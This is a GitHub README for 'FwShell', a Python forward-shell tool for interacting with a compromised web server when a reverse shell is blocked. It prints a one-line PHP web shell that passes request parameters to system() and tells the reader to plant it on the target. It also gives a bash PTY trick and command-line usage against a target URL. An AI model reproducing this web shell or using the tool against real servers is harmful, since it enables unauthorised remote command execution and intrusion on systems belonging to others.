# A Simple Forward Shell
**Language:** Python
**Stars:** 0

## README
**This script establishes a remote shell session that allows the execution of commands on the server interactively, handling output and state dynamically. Since some servers don't allow to get `reserse shell` due to their configuration, this script is a friendly alternative. The remote server must be configured to allow command execution or simply get a PHP structure loaded on the compromised server.**

![FwShell](https://github.com/ch4rum/FwShell/blob/master/srcRun.png?raw=true)

```php
<?php
    system($_REQUEST['cmd']); # use too, $_GET
?>
```

Take into account the path to the compromised server, where the bug or our PHP script is located.

## Features:
- **Remotely execute commands:** Sends shell commands to the remote server and receives the results in real time.
- **Interactive shell:** Allows you to interact with the remote system similar to a local terminal.
- **Pseudo-terminal management:** You can use a pseudo-terminal (`script /dev/null -c /bin/bash`) to keep the session interactive.
- **Command history management:** The script keeps a history of the commands executed during the session.
- **Configurable execution intervals:** The interval between command executions can be adjusted.
- **Session termination:** At the end of the session, the scriptdeletes temporary files.

## Usage
First download the code
```shell
git clone --no-checkout http://github.com/ch4rum/FwShell.git
```
To run the script, you can use the following command:
```shell
python3 main.py -u <URL> -i <interval>
```
- `-u` o `--url <URL>` is the Url of the remote server.
- `-i` o `--interval <interval>` is an optional parameter that sets the interval (in seconds) between command execution. If not specified, the default value is `0.5` seconds.

To exit the session, you can run `ctrl + c`.

## Files

**Raw:** https://raw.githubusercontent.com/ch4rum/FwShell/refs/heads/master/README.md
**Raw:** https://raw.githubusercontent.com/ch4rum/FwShell/refs/heads/master/fwShell.py